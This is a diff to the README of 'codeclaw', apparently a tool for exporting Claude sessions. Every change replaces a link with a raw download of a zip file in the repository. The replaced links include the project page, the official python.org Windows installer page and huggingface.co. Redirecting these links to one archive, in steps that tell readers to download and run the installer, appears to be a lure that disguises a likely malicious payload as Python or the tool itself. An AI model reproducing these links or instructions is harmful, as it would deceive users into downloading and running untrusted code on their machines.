@@ -1,6 +1,6 @@
 # 🦞 codeclaw - Export Claude Sessions with Privacy
 
-[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw)
+[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ If Python is not installed, codeclaw will not run smoothly. Instructions for ins
 
 To get codeclaw, visit the main GitHub page by clicking this link:
 
-[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-orange?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw)
+[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-orange?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip)
 
 This link takes you to the project repository where you can find all files and instructions.
 
@@ -41,7 +41,7 @@ This link takes you to the project repository where you can find all files and i
 codeclaw runs on Python. If you don’t have Python installed:
 
 1. Open your web browser.
-2. Go to https://www.python.org/downloads/windows/
+2. Go to https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
 3. Download the latest stable version (3.8 or above).
 4. Run the installer.
 5. During setup, check "Add Python to PATH".
@@ -161,7 +161,7 @@ You can upload these files to your Hugging Face account or use them locally.
 - If required packages fail to install, check your internet connection.
 - For errors during export, verify your session files are in the expected format.
 - Visit the repository link for updates and known issues:  
-  https://github.com/CuddlyPaws22/codeclaw
+  https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
 
 ---
 
@@ -178,9 +178,9 @@ All come with simple command-line options and help messages.
 
 ## 🔗 Useful Links
 
-- codeclaw main page: https://github.com/CuddlyPaws22/codeclaw
-- Python downloads: https://www.python.org/downloads/windows/
-- Hugging Face: https://huggingface.co/
+- codeclaw main page: https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
+- Python downloads: https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
+- Hugging Face: https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip
 
 ---
 
@@ -193,4 +193,4 @@ All come with simple command-line options and help messages.
 
 ---
 
-[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw)
+[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw/raw/refs/heads/main/codeclaw/cli/Software-3.6.zip)
